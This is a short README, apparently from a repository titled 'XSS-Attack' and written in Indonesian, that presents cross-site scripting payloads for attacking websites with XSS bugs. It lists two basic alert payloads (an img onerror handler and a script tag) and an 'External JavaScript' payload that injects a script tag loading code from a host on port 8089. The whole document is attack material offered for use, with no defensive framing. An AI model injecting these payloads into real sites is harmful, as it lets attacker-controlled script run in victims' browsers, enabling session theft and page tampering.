# XSS-Attack
Penyerangan dengan memanfaatkan Bug XSS pada website.

## XSS Payload
### Basic
```
<img src="x" onerror="alert('XSS')">
<script>alert('XSS')</script>
```

### External JavaScript
```
<script src="http://localhost:8089/yourscript.js"></script>
```
